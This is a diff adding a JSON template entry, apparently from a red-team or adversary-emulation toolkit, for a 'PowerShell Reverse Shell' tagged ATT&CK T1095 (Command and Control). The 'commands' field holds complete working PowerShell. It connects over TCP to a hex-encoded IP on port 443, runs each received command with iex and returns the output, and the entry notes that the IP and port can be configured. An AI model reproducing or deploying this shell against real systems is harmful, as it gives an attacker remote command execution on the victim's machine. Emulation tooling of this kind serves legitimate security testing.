@@ -1,0 +1,14 @@
+{
+  "name": "PowerShell Reverse Shell",
+  "ID": "T1095",
+  "elevated": "No",
+  "tactic": "Command and Control",
+  "template": "PowerShell",
+  "commands": "@\"$attackerMachine = New-Object System.Net.Sockets.TCPClient('0xc0a8003c',443);\r\n$stream = $attackerMachine.GetStream();\r\n[byte[]]$BYTES = 0..65535|%{0};\r\n\r\nwhile(($i = $stream.Read($BYTES, 0, $BYTES.Length)) -ne 0)\r\n{\r\n    $input = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($BYTES,0, $i);\r\n    $standardOutput = (iex $input 2>&1 | Out-String ); #Setup standard output to be sent over stream\r\n    $standardOutput += '> ';\r\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($standardOutput);\r\n    $stream.Write($sendbyte,0,$sendbyte.Length);\r\n    $stream.Flush();\r\n}\r\n$attackerMachine.Close();",
+  "desc": "Reverse Shell utilising PowerShell.exe to handle stream, input and output. Configurable with an IP address and a port as arguments.",
+  "hasArgs": "true",
+  "arg1": "IP Address",
+  "arg2": "Port",
+  "arg3": "N/A",
+  "isCPP": "false"
+}
